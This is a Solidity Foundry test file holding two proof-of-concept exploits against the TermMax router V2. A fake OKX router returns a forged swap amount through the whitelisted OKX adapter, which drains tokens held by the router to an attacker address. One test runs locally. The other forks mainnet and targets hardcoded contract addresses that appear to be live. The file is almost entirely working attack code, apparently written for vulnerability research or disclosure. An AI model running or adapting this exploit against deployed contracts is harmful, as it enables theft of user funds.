// SPDX-License-Identifier: MIT
pragma solidity ^0.8.27;
import {RouterTestV2} from "./RouterV2.t.sol";
import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {OkxSwapAdapter} from "contracts/v2/router/swapAdapters/OkxSwapAdapter.sol";
import {IWhitelistManager} from "contracts/v2/access/IWhitelistManager.sol";
import {TermMaxRouterV2, SwapUnit, SwapPath} from "contracts/v2/router/TermMaxRouterV2.sol";

contract LocalInputTokenTM is ERC20 {
    constructor() ERC20("Local Input", "LIN") {}
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract FakeOkxRouterTM {
    IERC20 immutable input;
    uint256 immutable forged;
    constructor(IERC20 input_, uint256 forged_) { input = input_; forged = forged_; }
    function uniswapV3SwapTo(uint256, uint256 amount, uint256, uint256[] calldata) external returns (uint256) {
        require(input.transferFrom(msg.sender, address(this), amount));
        return forged;
    }
}

contract TermMaxOkxArbitraryTargetDrainPoC is RouterTestV2 {
    function test_PoC_WhitelistedOkxAdapterDrainsUnrelatedRouterTokenViaForgedReturn() public {
        OkxSwapAdapter adapter = new OkxSwapAdapter();
        address[] memory adapters = new address[](1); adapters[0] = address(adapter);
        vm.prank(deployer);
        res.whitelistManager.batchSetWhitelist(adapters, IWhitelistManager.ContractModule.ADAPTER, true);

        address attacker = makeAddr("attacker");
        uint256 victimBalance = 1_000_000e8;
        res.debt.mint(address(res.router), victimBalance);
        res.collateral.mint(attacker, 1);
        FakeOkxRouterTM fake = new FakeOkxRouterTM(IERC20(address(res.collateral)), victimBalance);
        uint256[] memory pools = new uint256[](0);
        bytes memory callData = abi.encodeWithSelector(fake.uniswapV3SwapTo.selector, uint256(0), uint256(1), uint256(0), pools);
        SwapUnit[] memory units = new SwapUnit[](1);
        units[0] = SwapUnit(address(adapter), address(res.collateral), address(res.debt), abi.encode(address(fake), address(fake), callData));
        SwapPath[] memory paths = new SwapPath[](1);
        paths[0] = SwapPath({inputAmount: 1, recipient: attacker, useBalanceOnchain: false, units: units});

        vm.startPrank(attacker);
        res.collateral.approve(address(res.router), 1);
        uint256[] memory outputs = res.router.swapTokens(paths);
        vm.stopPrank();
        assertEq(outputs[0], victimBalance);
        assertEq(res.debt.balanceOf(attacker), victimBalance);
        assertEq(res.debt.balanceOf(address(res.router)), 0);
    }
}

contract TermMaxOkxLiveForkDrainPoC is Test {
    address constant ROUTER = 0x324596C1682a5675008f6e58F9C4E0A894b079c7;
    address constant ADAPTER = 0x8fE56ef6fD4f64dd2A0eB21FB634391890455f63;
    address constant WL = 0xB84f2a39b271D92586c61232a73ee1F7adFBf317;

    function test_PoC_LiveForkDrainCurrentRouterBalance() public {
        vm.createSelectFork(vm.envString("MAINNET_RPC_URL"), vm.envUint("FORK_BLOCK"));
        address victim = vm.envAddress("VICTIM_TOKEN");
        assertTrue(IWhitelistManager(WL).isWhitelisted(ADAPTER, IWhitelistManager.ContractModule.ADAPTER));
        uint256 victimBalance = IERC20(victim).balanceOf(ROUTER);
        assertGt(victimBalance, 0);

        LocalInputTokenTM input = new LocalInputTokenTM();
        address attacker = makeAddr("live-attacker");
        input.mint(attacker, 1);
        FakeOkxRouterTM fake = new FakeOkxRouterTM(input, victimBalance);
        uint256[] memory pools = new uint256[](0);
        bytes memory callData = abi.encodeWithSelector(fake.uniswapV3SwapTo.selector, uint256(0), uint256(1), uint256(0), pools);
        SwapUnit[] memory units = new SwapUnit[](1);
        units[0] = SwapUnit(ADAPTER, address(input), victim, abi.encode(address(fake), address(fake), callData));
        SwapPath[] memory paths = new SwapPath[](1);
        paths[0] = SwapPath({inputAmount: 1, recipient: attacker, useBalanceOnchain: false, units: units});

        vm.startPrank(attacker);
        input.approve(ROUTER, 1);
        uint256[] memory outputs = TermMaxRouterV2(ROUTER).swapTokens(paths);
        vm.stopPrank();
        assertEq(outputs[0], victimBalance);
        assertEq(IERC20(victim).balanceOf(attacker), victimBalance);
        assertEq(IERC20(victim).balanceOf(ROUTER), 0);
    }
}
